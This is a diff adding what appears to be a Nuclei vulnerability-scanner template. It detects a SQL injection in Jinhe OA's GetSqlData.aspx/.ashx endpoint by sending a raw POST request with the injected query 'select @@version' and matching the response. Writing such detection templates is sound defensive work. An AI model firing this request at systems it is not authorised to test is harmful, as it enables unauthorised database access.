@@ -1,0 +1,30 @@
+id: CVD-2023-2789
+info:
+  name: Jinhe OA SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Jinhe OA C6/Control/GetSqlData.aspx/.ashx file SQL injection vulnerability allows attackers to execute SQL commands and potentially gain unauthorized access to server resources.
+  tags: sqli
+http:
+  - raw:
+      - |
+        POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        select @@version
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "SQL"
+
+variables:
+  sql_payload: "select @@version"
